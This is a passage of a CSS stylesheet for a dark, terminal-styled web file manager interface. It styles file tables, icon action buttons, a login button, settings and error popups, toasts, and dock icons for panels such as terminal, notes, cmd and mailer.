        .profile-code { display:flex; flex-direction:column; gap:6px; align-items:center; }
        .profile-svg-code { width: min(92%, 480px); min-height:140px; border:0; border-radius:8px; background: transparent; color:#e8f0f7; font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:12px; line-height:1.5; padding:8px; resize:vertical; margin: 0 auto; outline: none; }
        .profile-code .profile-copy { background: transparent; border: 0; opacity: 0.75; }
        .profile-code .profile-copy:hover { opacity: 1; }
        .profile-actions .btn, .profile-actions .btn.secondary { background: transparent; border: 0; opacity: 0.85; }
        .profile-actions .btn:hover, .profile-actions .btn.secondary:hover { opacity: 1; }
        .btn.btn-icon { padding: 6px; min-width: auto; border-radius: 10px; }
        .btn.btn-icon .material-symbols-rounded { font-size: 20px; }
        .btn.btn-icon svg { width: 20px; height: 20px; }
        .zip-icon, .unzip-icon { width: 20px; height: 20px; display: inline-block; }
        .name-cell .zip-icon, .name-cell .unzip-icon { vertical-align: -3px; margin-right: 6px; }
        /* APNG Guide (cmd-style) */
        .profile-guide-window { position: fixed; top: 170px; left: 180px; width: min(90vw, 560px); max-height: 70vh; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(10,12,16,0.85); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; display:none; z-index: 10006; }
        .profile-guide-window.show { display:block; }
        .profile-guide-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .profile-guide-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .profile-guide-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .profile-guide-close:hover { background: rgba(255,255,255,0.06); }
        .profile-guide-close .material-symbols-rounded { color: rgba(255,0,0,0.80); }
        .profile-guide-body { padding:12px; }
        .profile-guide-output { font-family: ui-monospace, Menlo, Monaco, Consolas, 'Ubuntu Mono', monospace; background: rgba(6,8,10,0.30); border:1px solid var(--border); border-radius:8px; padding:12px; color:#e8f0f7; }
        .profile-guide-output a { color: Chartreuse; text-decoration:none; }
        .profile-guide-output pre { margin:0; white-space:pre-wrap; }
        /* App Loading Overlay */
        #app-loading { position: fixed; inset: 0; background: transparent; display: flex; align-items: center; justify-content: center; z-index: 10050; transition: opacity 200ms ease-in-out; pointer-events: none; }
        #app-loading.hide { opacity: 0; }
        .loading-box { display:flex; flex-direction:column; align-items:center; gap:8px; }
        .loading-logo { width: 48px; height: 48px; }
        .loading-spinner { transform-origin: 50% 50%; animation: spin 1000ms linear infinite; }
        #welcome-overlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; z-index: 10051; background: rgba(10,12,16,0.92); backdrop-filter: blur(4px); pointer-events: none; }
        #welcome-overlay.show { display: flex; }
        .welcome-box { display: flex; flex-direction: column; align-items: center; gap: 8px; color: #cfd6df; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
        .welcome-text { font-size: 16px; letter-spacing: 0.6px; }
        .loading-text { display:none; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .apptools-titlebar { display:flex; align-items:center; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.30); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .apptools-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .apptools-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .apptools-close:hover { background: rgba(255,255,255,0.06); }
        .apptools-body { padding:12px; display:grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); grid-auto-rows: auto; gap:10px; }
        .apptools-card { border:1px solid var(--border); border-radius:10px; padding:12px; background: rgba(10,12,16,0.20); display:flex; flex-direction:column; align-items:center; justify-content:center; gap:8px; cursor:pointer; text-align:center; min-height:120px; }
        .apptools-card:hover { background: rgba(255,255,255,0.06); }
        .apptools-card .material-symbols-rounded { color: Chartreuse; font-size:36px; }
        .apptools-card .label { display:block; margin-top:2px; font-weight:500; font-size:13px; color:#dfe6ef; text-shadow: 0 1px 2px rgba(0,0,0,0.25); }
        h1 { font-size:18px; margin:0 0 6px; letter-spacing:0.5px; color:#cfe8d0; }
        .path { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; color:#9fb7a6; font-size:13px; }
        .container { padding:18px 24px; max-width:1100px; margin:0 auto 28px; background:rgba(10,12,16,var(--acrylic)); border:1px solid var(--border); border-top:none; border-radius:0 0 12px 12px; backdrop-filter: blur(14px) saturate(120%); box-shadow: 0 12px 40px var(--shadow); position:relative; }
        .container::after { content:""; position:absolute; left:0; right:0; bottom:0; height:22%; background: linear-gradient(0deg, rgba(122,64,152,0.22) 0%, rgba(0,0,0,0) 100%); pointer-events:none; border-radius:0 0 12px 12px; }
        table { width:100%; border-collapse: separate; border-spacing:0; }
        thead th { text-align:left; font-weight:600; color:var(--muted); font-size:12px; padding:10px 12px; border-bottom:1px solid var(--border); }
        /* Keep distinct space for columns */
        table { table-layout: fixed; width:100%; }
        thead th:nth-child(1), tbody td:nth-child(1) { width:24%; }
        thead th:nth-child(2), tbody td:nth-child(2) { width:9%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        thead th:nth-child(3), tbody td:nth-child(3) { width:8%; text-align:right; }
            thead th:nth-child(4), tbody td:nth-child(4) { width:11%; }
            /* Modified column uses grey (muted) */
            tbody td.modified { color: var(--muted); }
        thead th:nth-child(5), tbody td:nth-child(5) { width:48%; }
        /* Keep Actions in one line; scroll if overflow */
        td.actions { display:flex; align-items:center; gap:8px; flex-wrap:nowrap; white-space:nowrap; overflow:visible; }
        td.actions .btn, td.actions .btn-icon, td.actions .btn-danger { flex:0 0 auto; }
        .th-icon { font-size:14px; vertical-align:-2px; margin-right:6px; color:var(--muted); }
        tbody tr { background:transparent; border-bottom:1px dashed var(--border); }
        tbody tr:last-child { border-bottom:none; }
        tbody td { padding:10px 12px; font-size:14px; }
        tr:hover { background:rgba(255,255,255,0.04); }
        a { color:var(--accent); text-decoration: none; }
        a:hover { color:var(--accentDim); }
        .muted { color:var(--muted); }
        .actions a { margin-right:8px; }
        .actions span { margin-right:8px; color:var(--muted); }
        .material-symbols-rounded { font-variation-settings: 'FILL' 1, 'wght' 500, 'GRAD' 0, 'opsz' 24; font-size:18px; vertical-align:-3px; }
        /* Icon-only action buttons */
        .btn-icon { width:26px; height:26px; padding:0; display:inline-flex; align-items:center; justify-content:center; position:relative; }
        .btn-icon .material-symbols-rounded { vertical-align:baseline; }
        .btn.btn-danger .material-symbols-rounded { color:#ff5b5b; }
        /* Hover label for icon-only buttons */
        .btn-icon[data-label]::after { content: attr(data-label); position:absolute; left:50%; bottom: calc(100% + 8px); transform: translateX(-50%) scale(0.98); background: rgba(46,49,57,0.92); color: var(--text); border:1px solid var(--border); border-radius:8px; padding:4px 8px; font-size:12px; white-space:nowrap; box-shadow: 0 6px 14px rgba(0,0,0,0.35); opacity:0; pointer-events:none; transition: opacity .15s ease, transform .15s ease; }
        .btn-icon:hover::after { opacity:1; transform: translateX(-50%) scale(1); }
        .ic-folder { color:Moccasin; }
        .ic-folder.readonly { color: FireBrick; }
        /* Folder name link text should be white; keep icon color */
        .folder-link { color:#ffffff; }
        .folder-link:hover { color:#ffffff; }
        .ic-file { color:#b6f3be; }
        .ic-audio { color:#9ad0ff; }
        .ic-video { color:#ffb3b3; }
        .ic-zip { color:#f7da9c; }
        .ic-txt { color: Khaki; }
        .fa-brands { font-size:18px; vertical-align:-3px; }
        .ic-php { color:#777bb3; }
        .ic-html { color:#e34f26; }
        .ic-js { color:#f7df1e; }
        .ic-css { color:#1572B6; }
        .ic-python { color:#3776AB; }
        .btn { display:inline-block; padding:4px 9px; border:1px solid var(--border); border-radius:6px; color:var(--accent); background:transparent; }
        .btn:hover { background:rgba(255,255,255,0.05); }
        /* Icon-only buttons: square size with perfectly centered icon */
        .btn-icon { display:inline-flex; align-items:center; justify-content:center; width:26px; height:26px; padding:0; border-radius:13px; line-height:1; }
        /* Remove circular border for file actions: Download, Delete, Zip, Unzip */
        .btn.btn-icon[data-label="Download"],
        .btn.btn-icon[data-label="Delete"],
        .btn.btn-icon.btn-danger[data-label="Delete"],
        .btn.btn-icon[data-label="Zip"],
        .btn.btn-icon[data-label="Unzip"],
        .btn.btn-icon[data-label="Unlock"] {
            border: 0;
            background: transparent;
            box-shadow: none;
        }
        .btn.btn-icon[data-label="Download"]:hover,
        .btn.btn-icon[data-label="Delete"]:hover,
        .btn.btn-icon.btn-danger[data-label="Delete"]:hover,
        .btn.btn-icon[data-label="Zip"]:hover,
        .btn.btn-icon[data-label="Unzip"]:hover,
        .btn.btn-icon[data-label="Unlock"]:hover {
            background: transparent;
        }
        .btn-danger { color:#ffd7d7; border-color:#3a1f1f; background:transparent; }
        .btn-danger:hover { background:rgba(255,0,0,0.08); }
        /* Close buttons: red X icon and visible hover tint */
.notes-close, .mailer-close, .browser-close, .wallpaper-close, .cmd-close, .term-close, .settings-close, .editor-close, .upload-close, .add-close, .rename-close, .clean-close, .apptools-close, .errors-close, .profile-close, .serverinfo-close, .how-close, .cmdhelp-close { border-color: rgba(139,0,0,0.35); }
.notes-close:hover, .mailer-close:hover, .browser-close:hover, .wallpaper-close:hover, .cmd-close:hover, .term-close:hover, .settings-close:hover, .editor-close:hover, .upload-close:hover, .add-close:hover, .rename-close:hover, .clean-close:hover, .apptools-close:hover, .errors-close:hover, .serverinfo-close:hover, .how-close:hover, .cmdhelp-close:hover { background: rgba(139,0,0,0.08); }

        /* Mobile responsive: simplify file manager layout and actions */
        @media (max-width: 640px) {
            /* Container spacing for small screens */
            .container { padding: 14px 12px; max-width: 100%; border-radius: 0 0 10px 10px; }


            /* Hide non-essential columns on mobile (Type, Size, Modified) */
            thead th:nth-child(2),
            thead th:nth-child(3),
            thead th:nth-child(4),
            tbody td:nth-child(2),
            tbody td:nth-child(3),
            tbody td:nth-child(4) { display: none; }

            /* Expand Name and Actions columns */
            thead th:nth-child(1), tbody td:nth-child(1) { width: 62% !important; }
            thead th:nth-child(5), tbody td:nth-child(5) { width: 38% !important; }

            /* Name cell: slightly larger icon, strong truncation */
            .name-cell .material-symbols-rounded, .name-cell .fa-brands { font-size: 20px; vertical-align: -2px; }
            .name-ellipsis { max-width: 100%; }

            /* Actions: icon-only, wrap when needed */
            td.actions { gap: 6px; flex-wrap: wrap; white-space: normal; }
            td.actions .btn { padding: 0; min-width: auto; border-radius: 10px; font-size: 0; line-height: 1; display: inline-flex; align-items: center; gap: 0; }
            td.actions .btn .material-symbols-rounded { font-size: 22px; margin: 0; }
            td.actions .btn.btn-icon { width: 30px; height: 30px; border-radius: 12px; }

            /* Keep dangerous action visible tinting */
            td.actions .btn.btn-danger { border: 0; background: transparent; }

            /* Tighten table row padding */
            tbody td { padding: 9px 10px; }
        }

        /* Mobile header tweaks: icon-only search and icon alignment */
        @media (max-width: 640px) {
            .status-tools { gap: 6px; }
            .status-search input { display: none; }
            .status-search { width: 30px; padding: 0; justify-content: center; }
            .status-search .material-symbols-rounded { font-size: 20px; }

            .header-bar { padding: 8px 12px; }
            /* Keep logo visible on mobile */
            .logo-area { display: flex; align-items: center; }
            .logo-title { font-size: 16px; }
            .app-icons { justify-content: flex-end; gap: 8px; overflow-x: auto; -webkit-overflow-scrolling: touch; padding-bottom: 2px; }

            /* Hide all header app icons except Settings, About, Logout */
            .app-icons .app-icon { display: none; }
            .app-icons #settings-trigger,
            .app-icons #about-trigger,
            .app-icons #logout-trigger { display: flex; }
        }
        .notes-close .material-symbols-rounded,
        .mailer-close .material-symbols-rounded,
        .browser-close .material-symbols-rounded,
        .wallpaper-close .material-symbols-rounded,
        .cmd-close .material-symbols-rounded,
        .term-close .material-symbols-rounded,
        .about-close .material-symbols-rounded,
        .editor-close .material-symbols-rounded,
        .how-close .material-symbols-rounded,
        .cmdhelp-close .material-symbols-rounded { color:DarkRed; }
.upload-close .material-symbols-rounded, .add-close .material-symbols-rounded, .rename-close .material-symbols-rounded, .clean-close .material-symbols-rounded, .apptools-close .material-symbols-rounded, .errors-close .material-symbols-rounded, .serverinfo-close .material-symbols-rounded, .how-close .material-symbols-rounded, .cmdhelp-close .material-symbols-rounded { color:DarkRed; }
      /* Rename button styling: white text, green icon */
      .btn-rename { color:#ffffff; }
      /* Header icon color for Errors */
      #errors-trigger .errors-icon { color: #E53935; }

      /* Errors popup specifics: compact and terminal-like */
.errors-window { width: min(92vw, 560px); }
.errors-body { padding: 12px; display:flex; flex-direction:column; gap:10px; }
.errors-summary { font-size:12px; color:#9aa3af; }
.errors-output { display:block; min-height: 120px; max-height: 180px; border:1px solid var(--border); border-radius:8px; background: rgba(6,8,10,0.22); color:#e8f0f7; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; font-size:13px; line-height:1.35; padding:10px; white-space: pre-wrap; width:90%; max-width:440px; margin:0 auto; overflow:auto; }
/* Error popup used for validation messages */
.errors-window.message .errors-summary { color: Crimson; }
.errors-term { display:none; }
.errors-term .cmd { color: Chartreuse; }
.errors-term .err { color:#ff6b6b; }
.errors-term .cursor { display:inline-block; width:10px; background: Chartreuse; animation: blink 1s steps(1) infinite; vertical-align: -2px; }
.errors-actions { display:flex; align-items:center; gap:8px; }
.errors-scan { background: var(--accent); border-color: var(--accentDim); color:#ffffff; }
.errors-scan:hover { background: var(--accentDim); }
.errors-scan .material-symbols-rounded { color:#000000; font-size:18px; vertical-align:-3px; margin-right:0; }
.errors-clear { color:#ff3b3b; border-color: rgba(255,0,0,0.35); }
.errors-clear:hover { background: rgba(255,0,0,0.08); }
.errors-clear .material-symbols-rounded { color:#ff3b3b; font-size:18px; vertical-align:-3px; }

.how-window { width: min(94vw, 860px); max-height: 80vh; }
.how-body { padding: 12px; display:grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap:10px; overflow:auto; max-height: calc(80vh - 48px); }
.how-list { display: contents; }
.how-item { border:1px solid var(--border); border-radius:8px; background: rgba(6,8,10,0.22); padding:10px; display:flex; align-items:flex-start; gap:10px; }
.how-item { cursor: default; }
.how-item .how-icon { width:24px; height:24px; display:flex; align-items:center; justify-content:center; }
.how-item .title { font-weight:600; }
.how-item .desc { font-size:12px; color:#9aa3af; margin-top:4px; }

.cmdhelp-window { width: min(94vw, 860px); max-height: 80vh; }
.cmdhelp-body { padding: 12px; display:flex; flex-direction:column; gap:10px; overflow:auto; max-height: calc(80vh - 48px); }
.cmdhelp-item { border:1px solid var(--border); border-radius:8px; background: rgba(6,8,10,0.22); padding:10px; }
.cmdhelp-item .title { font-weight:600; }
.cmdhelp-item .desc { font-size:12px; color:#9aa3af; margin-top:4px; }
.cmdhelp-item .ex { font-family: 'Ubuntu Mono', 'Courier New', monospace; font-size:13px; line-height:1.6; white-space:pre-wrap; background: rgba(6,8,10,0.22); border:1px solid var(--border); border-radius:6px; padding:8px; margin-top:6px; color:#cfd6df; }

        /* Settings window (desktop app) */
        .settings-window { position: fixed; top: 180px; left: 140px; width: min(92vw, 560px); border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10002; }
        .settings-window.show { display:block; }
        .settings-titlebar { display:flex; align-items:center; gap:8px; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.20); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
        .settings-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .settings-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
        .settings-close .material-symbols-rounded { color:DarkRed; }
        .settings-body { padding:12px; display:flex; flex-direction:column; gap:10px; }
        .settings-row { display:flex; align-items:center; gap:10px; }
        .settings-row .label { width:160px; color:#aab3be; }
        .settings-input { flex:1; border:1px solid var(--border); border-radius:8px; padding:8px 10px; background: transparent; color:#cfd6df; }
        .settings-actions { display:flex; align-items:center; gap:10px; padding:10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.12); border-radius:0 0 12px 12px; }
        .settings-actions .btn { border:1px solid var(--border); border-radius:8px; padding:8px 12px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; gap:6px; }
        .settings-actions .btn:hover { background: rgba(255,255,255,0.06); }
.settings-actions .btn-save .material-symbols-rounded { color: Chartreuse; }
        .settings-actions .btn-gen .material-symbols-rounded { color:#ff9800; }
.settings-actions .btn-copy .material-symbols-rounded { color: Chartreuse; }
        /* Settings dock icon styled like other app icons */
        .settings-row .settings-eye { width:32px; height:32px; border:1px solid var(--border); border-radius:8px; background: transparent; color:#cfd6df; cursor:pointer; display:inline-flex; align-items:center; justify-content:center; }
        .settings-row .settings-eye:hover { background: rgba(255,255,255,0.06); }
        .settings-row .settings-eye .material-symbols-rounded { font-size:20px; color:#aab3be; }
        /* Password field icons: use logo green */
		.settings-row .pw-icon { font-size:20px; color: Chartreuse; }
        /* Terminal-style toast for success/error messages */
.term-toast { position:fixed; bottom:24px; left:24px; background:#0b0f14; color: Chartreuse; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; border:1px solid #223244; border-radius:8px; padding:10px 12px; box-shadow: 0 10px 24px rgba(0,0,0,0.45); opacity:0; transform: translateY(10px); transition: opacity .18s ease, transform .18s ease; pointer-events:none; z-index:9999; }
        .term-toast.show { opacity:1; transform: translateY(0); }
.term-toast .prompt { color: Chartreuse; margin-right:6px; }
        .term-toast.error { color:#ffa8a8; border-color:#4a1d1d; }
.term-toast .cursor { margin-left:6px; color: Chartreuse; animation: blink 1s step-end infinite; }
        @keyframes blink { 50% { opacity:0; } }

        /* Fullscreen overlay for terminal-style download animation */
        .overlay-terminal { position: fixed; inset: 0; background: rgba(8,10,12,0.35); backdrop-filter: blur(8px) saturate(120%); display:none; align-items:center; justify-content:center; z-index: 9999; }
        .overlay-terminal.show { display:flex; }
        .terminal-modal { width: 560px; max-width: 92vw; border-radius: 12px; border:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.22); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; }
        .terminal-modal .titlebar { display:flex; align-items:center; padding:10px 12px; border-bottom:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; }
        .terminal-modal .titlebar .traffic { margin-right:10px; }
        .terminal-modal .titlebar .term-close { margin-left:8px; border:1px solid rgba(255,255,255,0.08); background: transparent; color: DarkRed; width:26px; height:26px; border-radius:13px; display:inline-flex; align-items:center; justify-content:center; cursor:pointer; }
        .terminal-modal .titlebar .term-close:hover { background: rgba(255,255,255,0.06); }
        .terminal-modal .title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
        .terminal-modal .title .material-symbols-rounded { font-size:20px; color: Chartreuse; vertical-align:-4px; }
        .terminal-modal .title svg { width:20px; height:20px; vertical-align:-4px; margin-right:6px; }
        .terminal-modal .body { padding:16px; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; background: rgba(10,12,16,0.18); border-radius: 0 0 12px 12px; }
        .terminal-modal .output { min-height: 120px; white-space: pre-wrap; color: Chartreuse; }
        .terminal-modal .cursor { display:inline-block; width:10px; background: Chartreuse; animation: blink 1s steps(1) infinite; vertical-align: -2px; }
        /* Error theme for terminal overlay (red output, red cursor, red icon) */
        .overlay-terminal.error-theme .terminal-modal .title .material-symbols-rounded { color:#ff6b6b; }
        .overlay-terminal.error-theme .terminal-modal .output { color:#ff6b6b; }
        .overlay-terminal.error-theme .terminal-modal .cursor { background:#ff6b6b; }
        /* Transparent red backgrounds for error-themed terminal */
        /* Removed red-tinted backgrounds per request; keep only red text/cursor/icon for errors */
        @keyframes blink { 50% { opacity:0; } }
        .btn-rename:hover { color:#ffffff; }
        .btn-rename .material-symbols-rounded { color: Chartreuse; }
        .btn-rename .rename-icon { width:18px; height:18px; vertical-align:middle; margin-right:6px; display:inline-block; }
        /* Edit button styling: white text, LemonChiffon icon */
        .btn-edit { color:#ffffff; }
        .btn-edit:hover { color:#ffffff; }
        .btn-edit .material-symbols-rounded { color:#FFFACD; }
        .btn.btn-edit { display:inline-flex; align-items:center; gap:6px; }
        .btn-edit .edit-icon { width:18px; height:18px; vertical-align:middle; margin-right:6px; display:inline-block; }
        /* Zip/Unzip button styling: Chartreuse icons */
        .btn-zip .material-symbols-rounded { color: Chartreuse; }
        .btn-unzip .material-symbols-rounded { color: Chartreuse; }
        .pill { display:inline-block; padding:2px 8px; border:1px solid #3b3f53; border-radius:10px; font-size:12px; }
        .error { background: rgba(255, 0, 0, 0.10); border:1px solid rgba(255, 0, 0, 0.28); color:#ffd7d7; padding:8px 10px; border-radius:6px; margin:12px auto; display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; width:fit-content; }
        .error .material-symbols-rounded { color:#ffd7d7; font-size:20px; }
  /* Centered error variant for destructive actions */
  .error.error-center { display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; }
  .error.error-center .material-symbols-rounded { color:#f7d7d7; }
        .notice { background: rgba(46, 139, 87, 0.10); border:1px solid rgba(46, 139, 87, 0.28); color:#d7f7e7; padding:10px 14px; border-radius:8px; margin:14px auto; max-width:640px; display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; box-shadow: 0 6px 14px rgba(0,0,0,0.35); }
        .notice .material-symbols-rounded { color:#d7f7e7; }
        footer { padding:12px 20px; border-top:1px solid #2e313d; color:#9aa3af; font-size:12px; }
        .breadcrumb a { margin-right:8px; }
        .breadcrumb .sep { margin-right:8px; color:#586073; }
        .go-up a { display:inline-flex; align-items:center; gap:6px; }
        .go-up .material-symbols-rounded { animation: goUpBounce 1.2s ease-in-out infinite; will-change: transform, opacity; }
        @keyframes goUpBounce {
            0% { transform: translateY(0); opacity: 0.9; }
            50% { transform: translateY(-5px); opacity: 1; }
            100% { transform: translateY(0); opacity: 0.9; }
        }
        /* Transparent terminal-style editor */
        .editor-wrap { max-width: 900px; margin: 12px auto; }
        .editor-area { width:100%; display:block; min-height:220px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; color:var(--text); background: transparent; border:1px dashed var(--border); border-radius:8px; padding:10px 12px; resize:vertical; caret-color: var(--accent); outline:none; }
        .editor-area:focus { border-color: var(--accentDim); box-shadow: 0 0 0 1px rgba(127,255,0,0.25); background: rgba(10,12,16,0.18); backdrop-filter: blur(6px) saturate(120%); }
        .editor-area::selection { background: rgba(127,255,0,0.25); }
        .editor-actions { text-align: center; }
        /* Spotlight-style pill inputs */
        .form-actions { text-align:center; }
        .input-pill { display:flex; align-items:center; gap:10px; padding:10px 16px; border:1px solid var(--border); border-radius:9999px; background: rgba(46,49,57,0.55); backdrop-filter: blur(12px) saturate(120%); box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 6px 14px rgba(0,0,0,0.35); color:var(--text); }
        .input-pill .material-symbols-rounded { font-size:18px; color:#cbd5e1; }
        .input-pill input, .input-pill select { flex:1; background: transparent; border:0; outline:none; color:var(--text); font-size: var(--textBase); padding:6px 2px; }
        .input-pill input::placeholder { color:#9aa3af; }
        /* Terminal window chrome */
.terminal-chrome { max-width:1100px; margin:18px auto 0; padding:10px 24px; background: rgba(46,49,57,0.55); border:1px solid var(--border); border-bottom:none; border-radius:12px 12px 0 0; backdrop-filter: blur(12px) saturate(120%); box-shadow: 0 12px 22px rgba(0,0,0,0.35); }
        .terminal-bar { display:flex; align-items:center; gap:12px; }
        .traffic { display:flex; gap:8px; }
        .traffic .dot { width:12px; height:12px; border-radius:50%; box-shadow: inset 0 1px 0 rgba(255,255,255,0.15), 0 1px 2px rgba(0,0,0,0.35); }
        .traffic .dot.red { background:#ff5f56; }
        .traffic .dot.yellow { background:#ffbd2e; cursor:pointer; }
        .traffic .dot.yellow:hover { filter: brightness(0.95); }
        .traffic .dot.green { background: Chartreuse; }
        /* Logout button: red close dot with black × */
        .traffic .dot.logout { position:relative; cursor:pointer; }
        .traffic .dot.logout::after { content:"×"; position:absolute; left:0; top:0; width:100%; height:100%; display:flex; align-items:center; justify-content:center; color:#000; font-weight:800; font-size:10px; line-height:1; }
        .traffic .dot.logout:hover { filter: brightness(0.95); }
        .term-title { flex:1; text-align:center; color:#cfd6df; font-size:14px; font-weight:600; letter-spacing:0.2px; }
        .term-title a { color:#cfd6df; text-decoration:none; }
        .term-title a:hover { color:#e3e8ee; }
        .term-title a.disabled { pointer-events:none; opacity:0.7; cursor:not-allowed; }
        .term-title .path-root { color:#cfd6df; }
.term-title .material-symbols-rounded { font-size:18px; color: Chartreuse; vertical-align:-4px; }
        .term-action { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; }
        .term-action:hover { background: rgba(255,255,255,0.06); }
.term-action.term-back .material-symbols-rounded { color: Chartreuse; }
        .term-action.term-new .material-symbols-rounded { color:#ff9800; }
        /* Hide macOS-style traffic dots in terminal overlays only */
        .overlay-terminal .titlebar .traffic { display:none !important; }
        /* Icon-only actions inside forms */
        .icon-action { width:30px; height:30px; border-radius:15px; border:1px solid var(--border); display:inline-flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; margin:0 6px; vertical-align:middle; }
        .icon-action:hover { background: rgba(255,255,255,0.06); }
        .icon-action .material-symbols-rounded { font-size:22px; }
.icon-action.icon-confirm .material-symbols-rounded { color: Chartreuse; }
        .icon-action.icon-cancel .material-symbols-rounded { color:#aab3be; }
        /* Login button: bigger green fingerprint icon, red on hover (scan effect) */
        #login-submit { width:34px; height:34px; border-radius:17px; position:relative; overflow:hidden; transition: background .2s ease, box-shadow .2s ease, border-color .2s ease; }
#login-submit .material-symbols-rounded { font-size:32px; color: Chartreuse; transition: color .2s ease, transform .2s ease; }
        #login-submit:hover { background: rgba(255,0,0,0.12); border-color: rgba(255,0,0,0.55); box-shadow: 0 0 10px rgba(255,0,0,0.35); }
        #login-submit:hover .material-symbols-rounded { color:#ff3b3b; transform: scale(1.1); }
        /* Scanning sweep line */
        #login-submit::after { content:""; position:absolute; left:0; top:-100%; width:100%; height:100%; background: linear-gradient(to bottom, rgba(255,0,0,0) 0%, rgba(255,0,0,0.32) 50%, rgba(255,0,0,0) 100%); pointer-events:none; }
        #login-submit:hover::after { animation: scan-sweep .9s ease-in-out; }
        @keyframes scan-sweep { 0% { top:-100%; } 100% { top:100%; } }
        .command-pill { margin-top:10px; border:1px solid var(--border); border-radius:9999px; padding:8px 12px; color:#b6bec8; text-align:center; background: rgba(255,255,255,0.06); }
        /* Make header search input visually match the command pill */
        .command-bar .input-pill { height:34px; display:flex; align-items:center; padding:0 12px; border:1px solid var(--border); border-radius:9999px; background: rgba(255,255,255,0.06); color:#b6bec8; box-shadow:none; backdrop-filter:none; }
        .command-bar .input-pill .material-symbols-rounded { color:#b6bec8; }
        .command-bar .input-pill input { height:100%; line-height:34px; padding-top:0; padding-bottom:0; box-sizing:border-box; font-size: var(--textBase); color: var(--text); }
        /* Make the search button match the Back button size */
        .command-bar #file-search-btn { width:26px; height:26px; border-radius:13px; padding:0; }
        .command-bar #file-search-btn .material-symbols-rounded { font-size:18px; }
        /* Header search bar layout and slight vertical offset */
        .command-bar { display:flex; align-items:center; gap:8px; flex-wrap:nowrap; }
        .command-bar .search-bar { display:flex; align-items:center; gap:6px; margin-left:auto; max-width:380px; position:relative; top:3px; }
        .command-bar .search-bar .input-pill { flex:1; max-width:320px; }
        .add-window .input-pill, .rename-window .input-pill, .zip-window .input-pill, .unzip-window .input-pill { height:34px; display:flex; align-items:center; padding:0 12px; border:1px solid var(--border); border-radius:9999px; background: rgba(255,255,255,0.06); color:#b6bec8; box-shadow:none; backdrop-filter:none; margin:12px auto; max-width:480px; }
        .add-window .input-pill .material-symbols-rounded, .rename-window .input-pill .material-symbols-rounded, .zip-window .input-pill .material-symbols-rounded, .unzip-window .input-pill .material-symbols-rounded { color:#b6bec8; }
        .add-window .input-pill input, .add-window .input-pill select, .rename-window .input-pill input, .zip-window .input-pill input, .unzip-window .input-pill input { height:100%; line-height:34px; padding-top:0; padding-bottom:0; box-sizing:border-box; font-size: var(--textBase); color: var(--text); }
        .add-window input[type="radio"] { accent-color: #7fff00; }
        /* Dock icons styling (match header app icon design) */
        #terminal-dock, #notes-dock, #browser-dock, #cmd-dock, #wallpaper-dock, #mailer-dock, #settings-dock, #errors-dock, #apptools-dock, #clean-dock { position: fixed; inset: 0; z-index: 9998; pointer-events: none; }
        .dock-terminal, .dock-notes, .dock-browser, .dock-cmd, .dock-wallpaper, .dock-mailer, .dock-settings, .dock-errors, .dock-apptools, .dock-clean { display:flex; align-items:center; justify-content:center; cursor:pointer; color:#cfd6df; background:transparent; pointer-events:auto; position: fixed; }
